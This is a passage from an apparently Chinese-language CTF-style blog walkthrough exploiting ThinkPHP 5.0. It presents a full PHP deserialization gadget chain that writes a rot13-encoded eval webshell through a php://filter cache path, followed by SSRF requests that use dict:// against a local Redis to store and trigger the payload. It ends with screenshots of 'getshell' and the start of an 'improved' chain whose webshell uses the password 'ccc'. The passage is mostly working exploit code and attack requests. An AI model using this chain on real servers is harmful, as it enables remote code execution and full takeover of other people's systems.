data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Windows</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Pipes</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Pivot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Relation</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>Query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Relation</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$selfRelation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">selfRelation</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">query</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Query</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#class Query</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#OneToOne HasOne</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Relation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">OneToOne</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Relation</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">HasOne</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">OneToOne</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$bindAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">bindAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"123\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Output</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>Memcached</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Output</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$handle</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">handle</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Memcached</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 目的调用其 write ()</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'getAttr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Model</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation<span class=\"token punctuation\">\\</span>HasOne</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console<span class=\"token punctuation\">\\</span>Output</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>Query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Model</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$error</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$parent</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#修改处</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$selfRelation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$aaaaa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">parent</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Output</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Output 对象，目的是调用__call ()</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'getError'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">error</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HasOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Relation 子类，且有 getBindAttr ()</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">selfRelation</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//isSelfRelation()</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">query</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Query</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Query</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console<span class=\"token punctuation\">\\</span>Output</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Query</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">model</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Output</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Memcached</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>File</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Memcached</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$handler</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">handler</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 目的调用 File->set ()</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#File</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">File</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$tag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token string single-quoted-string\">'expire'</span>        <span class=\"token operator\">=></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        <span class=\"token string single-quoted-string\">'cache_subdir'</span>  <span class=\"token operator\">=></span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token string single-quoted-string\">'prefix'</span>        <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token string single-quoted-string\">'path'</span>          <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'php://filter/write=string.rot13/resource=./ccc/&lt;?cuc cucvasb();riny($_TRG[pzq]);?>'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token string single-quoted-string\">'data_compress'</span> <span class=\"token operator\">=></span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">tag</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>Model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pivot</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Model</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes<span class=\"token punctuation\">\\</span>Windows</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token variable\">$aaa</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"think_serialize:\"</span><span class=\"token operator\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Windows</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token operator\">~</span><span class=\"token variable\">$aaa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h2 id=\"第六步\"><a class=\"anchor\" href=\"#第六步\">#</a> 第六步：</h2>\n<p>写入反序列化数据：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//ip:8083/public/index.php/index/index/getUrl?url=dict://127.0.0.1:6379/set:zlsshell:&#123;序列化内容&#125;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202201812554.png\" alt=\"image-20240202201812554\" /></p>\n<h2 id=\"第七步\"><a class=\"anchor\" href=\"#第七步\">#</a> 第七步：</h2>\n<h2 id=\"第八步\"><a class=\"anchor\" href=\"#第八步\">#</a> 第八步：</h2>\n<p>与创建 /ccc 目录操作一样，不过多赘述</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//ip:8083/public/index.php/index/index/getUrl?url=dict://127.0.0.1:6379/bitop:not:saveshell:zlsshell</span></span></pre></td></tr></table></figure><figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//ip:8083/public/index.php/Index/Index/getname?name=saveshell</span></span></pre></td></tr></table></figure><p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202201833585.png\" alt=\"image-20240202201833585\" /></p>\n<p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202201857827.png\" alt=\"image-20240202201857827\" /></p>\n<h2 id=\"第九步\"><a class=\"anchor\" href=\"#第九步\">#</a> 第九步：</h2>\n<p>访问目录发现 shell，getshell</p>\n<p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202201922498.png\" alt=\"image-20240202201922498\" /></p>\n<p>getshell</p>\n<p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202050216861.png\" alt=\"image-20240202050216861\" /></p>\n<h2 id=\"改良版本\"><a class=\"anchor\" href=\"#改良版本\">#</a> 改良版本：</h2>\n<p>2024.2.4</p>\n<p>1. 上面的版本只能 linux 使用</p>\n<p>2. 步骤复杂操作麻烦</p>\n<p>3. 写入路径，当前目录下的：a.php3b58a9545013e88c7186db11bb158c44.php 文件，密码 ccc，post 请求</p>\n<p>更新了一下路由 url，效果一样</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Pivot</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pipes</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Windows</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Pipes</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Pivot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Relation</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>Query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Relation</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$selfRelation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">selfRelation</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">query</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Query</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#class Query</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token 